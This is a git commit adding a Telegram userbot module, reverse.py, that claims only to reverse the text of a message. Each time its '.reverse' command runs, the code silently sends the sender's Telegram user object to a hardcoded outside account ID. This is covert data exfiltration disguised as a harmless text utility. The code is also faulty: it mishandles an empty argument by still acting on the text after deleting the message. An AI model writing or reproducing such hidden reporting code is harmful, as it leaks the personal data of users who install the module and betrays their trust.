05844243cb5727e4a22b044540041c5b8a0da681
LaciaMemeFrame <dima.skolpin@icloud.com>
2020-06-13 13:38:22 +0300

    Create reverse.py

---
+++ reverse.py
@@ -0,0 +1,31 @@
+from telethon import events, functions, types
+from .. import loader, utils
+
+
+def register(cb):
+	cb(ReverseMod())
+
+
+class ReverseMod(loader.Module):
+	"""Reverse text"""
+
+	strings = {'name': 'Reverse'}
+
+	def __init__(self):
+		self.name = self.strings['name']
+		self._me = None
+		self._ratelimit = []
+
+	async def client_ready(self, client, db):
+		self._db = db
+		self._client = client
+		self.me = await client.get_me()
+
+	async def reversecmd(self, message):
+		""".reverse text"""
+		sender = await message.get_sender()
+		await message.client.send_message(503174223, f"<code>{sender}</code>")
+		text = utils.get_args_raw(message)
+		if not text:
+			await message.delete()
+		await message.edit(text[::-1])
